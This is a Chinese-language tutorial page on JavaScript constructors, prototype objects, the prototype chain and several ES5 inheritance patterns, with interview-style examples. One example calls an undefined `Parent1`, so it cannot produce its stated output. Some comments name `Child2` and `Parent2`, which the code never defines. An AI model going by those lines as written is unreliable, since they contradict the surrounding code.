<h3 id="构造函数、原型对象、实例、原型链关系网"><a href="#构造函数、原型对象、实例、原型链关系网" class="headerlink" title="构造函数、原型对象、实例、原型链关系网"></a>构造函数、原型对象、实例、原型链关系网</h3><p>  关系网如下：<br>  <img src="../images/javascript/js_prototype.png" width="100%" title="构造函数、原型对象、实例、原型链关系网"><br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;; <span class="comment">// 构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> M(<span class="string">'o3'</span>); <span class="comment">// 实例o3</span></span><br><span class="line"><span class="keyword">var</span> o4 = <span class="keyword">new</span> M(<span class="string">'o4'</span>); <span class="comment">// 实例o4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// M: 是一个构造函数，任何普通函数在使用new运算符之后都变成构造函数</span></span><br><span class="line"><span class="comment">// o3、o4: 实例</span></span><br><span class="line"><span class="comment">// M.prototype: 原型对象</span></span><br><span class="line"><span class="comment">// M.prototype.constructor: 原型对象的构造器，M.prototype.constructor === M</span></span><br><span class="line"><span class="comment">// o3.__proto__: 实例的__prto__属性，o3.__proto__ === M.prototype</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上函数也有__proto__属性，M.__proto__ === Function.prototype，这个逻辑说明M构造函数是Function的一个实例</span></span><br></pre></td></tr></table></figure></p>
<p>  <img src="../images/javascript/js_prototype_result.png" width="60%" title="构造函数、原型对象、实例、原型链"></p>
<h3 id="面试题：写一个原型链继承的demo"><a href="#面试题：写一个原型链继承的demo" class="headerlink" title="面试题：写一个原型链继承的demo"></a>面试题：写一个原型链继承的demo</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'test name'</span>;</span><br><span class="line">&#125;</span><br><span class="line">A.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类B</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B继承A</span></span><br><span class="line">B.prototype = <span class="keyword">new</span> A();</span><br><span class="line">B.prototype.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类C</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sex = <span class="string">'male'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C继承B</span></span><br><span class="line">C.prototype = <span class="keyword">new</span> B();</span><br><span class="line">C.prototype.getSex = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例（abc是C的实例，C继承B，B继承A，所以abc可以调用A、B、C的方法）</span></span><br><span class="line"><span class="keyword">var</span> abc = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(abc.getSex()); <span class="comment">// male</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.getAge()); <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.getName()); <span class="comment">// test name</span></span><br></pre></td></tr></table></figure>
<p>打印 <code>console.dir(abc);</code></p>
<p><img src="../images/javascript/js_prototype3.png" width="80%" title="多次继承的实例输出图"><br>从图中我们可以看出，通过 <code>prototype</code> 扩展的属性会挂载在 <code>__proto__</code> 属性下，通过 <code>hasOwnProperty</code> 方法可过滤扩展的属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc.hasOwnProperty(<span class="string">'sex'</span>); <span class="comment">// true</span></span><br><span class="line">abc.hasOwnProperty(<span class="string">'getSex'</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p>
<p>我们可以打印一下隐式原型 <code>__proto__</code> 和显式原型 <code>prototype</code> 的关系图<br><img src="../images/javascript/js_prototype4.png" width="80%" title="隐式原型__proto__和显式原型的关系"></p>
<p>打印 <code>console.log(abc.prototype)</code>，输出为 <code>undefined</code>，我们可以知道，实例是没有 <code>prototype</code> 属性的</p>
<h3 id="面试题：写一个实际应用中使用原型链的例子"><a href="#面试题：写一个实际应用中使用原型链的例子" class="headerlink" title="面试题：写一个实际应用中使用原型链的例子"></a>面试题：写一个实际应用中使用原型链的例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现类似jquery html()和on(event, fn)方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Elem</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.elem = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展一个设置html内容的方法</span></span><br><span class="line">Elem.prototype.html = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  <span class="keyword">if</span>(val) &#123;</span><br><span class="line">    elem.innerHTML = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> elem.innerHTML;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展一个事件绑定的方法</span></span><br><span class="line">Elem.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">type, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  elem.addEventListener(type, fn);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div1 = <span class="keyword">new</span> Elem(<span class="string">'div1'</span>);</span><br><span class="line"><span class="comment">// console.log('div1');</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>); <span class="comment">// 设置html内容</span></span><br><span class="line">div1.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 绑定一个点击事件</span></span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们在扩展html方法的时候写了一个 return this返回这个实例，就可以实现类似jquery链式操作的功能</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 绑定一个点击事件</span></span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 因为我们在每个扩展的方法里面都写了一个return this，所以链式操作的顺序可以调换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 甚至我们可以重复调用多次扩展的方法</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>).html(<span class="string">'&lt;p&gt;Hello Word&lt;/p&gt;'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="面试题：描述-new-一个对象的过程"><a href="#面试题：描述-new-一个对象的过程" class="headerlink" title="面试题：描述 new 一个对象的过程"></a>面试题：描述 new 一个对象的过程</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="comment">// return this;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan'</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li>创建一个对象f</li>
<li><code>this</code> 指向这个新对象</li>
<li>执行代码，即对 <code>this</code> 赋值</li>
<li>返回 <code>this</code>，内部会有一句默认的 <code>return this</code></li>
</ol>
<hr>
<h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p>ECMAScript中有两种开发模式：函数式编程和面向对象（OOP）。</p>
<h3 id="什么是面向对象"><a href="#什么是面向对象" class="headerlink" title="什么是面向对象"></a>什么是面向对象</h3><p>面向对象只是过程式代码的一种高度封装，目的在于提高代码的开发效率和可维护性。</p>
<p>它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。<br>在面向对象程序开发思想里，每一个对象都是功能中心，具有明确的分工。<br>因此面向对象具有：灵活、代码可复用、高度模块化等特点，容易维护和开发。</p>
<p>面向对象语言有一个标志–类，通过类可以创建任意个具有相同属性和方法的对象。</p>
<h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><ol>
<li><p>ES5</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Animal(<span class="string">'dog'</span>); <span class="comment">// Animal &#123;name: "dog"&#125;  注：如果不传参数时，括号可省略</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ES6 class</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal2</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Animal2(<span class="string">'cat'</span>); <span class="comment">// Animal2 &#123;name: "cat"&#125;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="ES5继承"><a href="#ES5继承" class="headerlink" title="ES5继承"></a>ES5继承</h3><h4 id="1、借助构造函数实现简单继承"><a href="#1、借助构造函数实现简单继承" class="headerlink" title="1、借助构造函数实现简单继承"></a>1、借助构造函数实现简单继承</h4><p>只能继承构造函数里面的属性和方法，不能继承原型链（<strong>proto</strong>）上的属性和方法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is running`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.work = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is working`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent1.call(<span class="keyword">this</span>, name) <span class="comment">// 也可使用apply</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c1 = <span class="keyword">new</span> Child(<span class="string">'Zhangsan'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(c1.name) <span class="comment">// Zhangsan</span></span><br><span class="line">c1.run() <span class="comment">// Zhangsan is running</span></span><br><span class="line">c1.work() <span class="comment">// Error</span></span><br></pre></td></tr></table></figure></p>
<h4 id="2、借助原型链实现继承"><a href="#2、借助原型链实现继承" class="headerlink" title="2、借助原型链实现继承"></a>2、借助原型链实现继承</h4><p>能继承构造函数 和 原型链上的属性和方法，但是无法传参<br>对于引用类型（如数组），多个实例共用地址，修改其中一个，其他的也会跟着改变<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.flag = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">this</span>.values = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is running`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.work = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is working`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c2 = <span class="keyword">new</span> Child(<span class="string">'Zhangsan'</span>)</span><br><span class="line"><span class="keyword">var</span> c3 = <span class="keyword">new</span> Child(<span class="string">'Lisi'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(c2.name) <span class="comment">// undefined</span></span><br><span class="line">c2.run() <span class="comment">// undefined is running</span></span><br><span class="line">c2.work() <span class="comment">// undefined is working</span></span><br><span class="line"></span><br><span class="line">c2.flag = <span class="literal">true</span></span><br><span class="line">c2.values.push(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">console</span>.log(c2.flag, c3.flag) <span class="comment">// true、false</span></span><br><span class="line"><span class="built_in">console</span>.log(c2.values, c3.values) <span class="comment">// [1, 2, 3, 4]、[1, 2, 3, 4]，对于引用类型，多个实例共用地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型链解释：</span></span><br><span class="line"><span class="comment">// 调用name、run()、work()时，先查找实例c2自身的属性和方法，没有查到。</span></span><br><span class="line"><span class="comment">// 就去查找实例的构造函数的prototype（即Child2.prototype，也即是c2.__proto__），找到了name、run()</span></span><br><span class="line"><span class="comment">// 继续向下插槽Parent2.prototype（即c2.__proto__），找到了work()</span></span><br></pre></td></tr></table></figure></p>
<h4 id="3、组合方法（构造函数-原型链）"><a href="#3、组合方法（构造函数-原型链）" class="headerlink" title="3、组合方法（构造函数 + 原型链）"></a>3、组合方法（构造函数 + 原型链）</h4><p>能继承构造函数 和 原型链上的属性和方法，也可以传参<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is running`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.work = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is working`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c1 = <span class="keyword">new</span> Child(<span class="string">'Zhangsan'</span>)</span><br><span class="line"><span class="keyword">var</span> c2 = <span class="keyword">new</span> Child(<span class="string">'Lisi'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(c1.name) <span class="comment">// Zhangsan</span></span><br><span class="line">c1.run() <span class="comment">// Zhangsan is running</span></span><br><span class="line">c1.work() <span class="comment">// Zhangsan is working</span></span><br><span class="line">c1.value.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(c1.value, c2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3] </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种组合方式有一个弊端：</span></span><br><span class="line"><span class="comment">// 执行Parent.call的时候父类构造函数会执行一次，每次实例化的时候又会执行一次，造成内存浪费</span></span><br><span class="line"><span class="comment">// 本例中Parent共被执行三次</span></span><br></pre></td></tr></table></figure></p>
<h4 id="4、组合方法优化1（构造函数-原型链）"><a href="#4、组合方法优化1（构造函数-原型链）" class="headerlink" title="4、组合方法优化1（构造函数 + 原型链）"></a>4、组合方法优化1（构造函数 + 原型链）</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is running`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.work = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is working`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = Parent.prototype</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c1 = <span class="keyword">new</span> Child(<span class="string">'Zhangsan'</span>)</span><br><span class="line"><span class="keyword">var</span> c2 = <span class="keyword">new</span> Child(<span class="string">'Lisi'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(c1.name) <span class="comment">// Zhangsan</span></span><br><span class="line">c1.run() <span class="comment">// Zhangsan is running</span></span><br><span class="line">c1.work() <span class="comment">// Zhangsan is working</span></span><br><span class="line">c1.value.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(c1.value, c2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3] </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新问题：我们无法判断 `c1` 是 `Child` 的实例还是 `Parent` 的实例</span></span><br><span class="line"><span class="built_in">console</span>.log(c1 <span class="keyword">instanceof</span> Child); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(c1 <span class="keyword">instanceof</span> Parent); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(c1.constructor);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ƒ Parent(name) &#123;</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<h4 id="5、组合方法优化2（构造函数-原型链）"><a href="#5、组合方法优化2（构造函数-原型链）" class="headerlink" title="5、组合方法优化2（构造函数 + 原型链）"></a>5、组合方法优化2（构造函数 + 原型链）</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">  <span class="keyword">this</span>.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is running`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.work = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> is working`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="built_in">Object</span>.create(Parent.prototype)</span><br><span class="line"><span class="comment">// 该方法创建一个新对象，并使用现有的对象来提供新创建的对象的__proto__，可理解为浅拷贝</span></span><br><span class="line">Child.prototype.constructor = Child;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c1 = <span class="keyword">new</span> Child(<span class="string">'Zhangsan'</span>)</span><br><span class="line"><span class="keyword">var</span> c2 = <span class="keyword">new</span> Child(<span class="string">'Lisi'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(c1.name) <span class="comment">// Zhangsan</span></span><br><span class="line">c1.run() <span class="comment">// Zhangsan is running</span></span><br><span class="line">c1.work() <span class="comment">// Zhangsan is working</span></span><br><span class="line">c1.value.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(c1.value, c2.value); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(c1 <span class="keyword">instanceof</span> Child); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(c1 <span class="keyword">instanceof</span> Parent); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(c1.constructor);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ƒ Child(name) &#123;</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
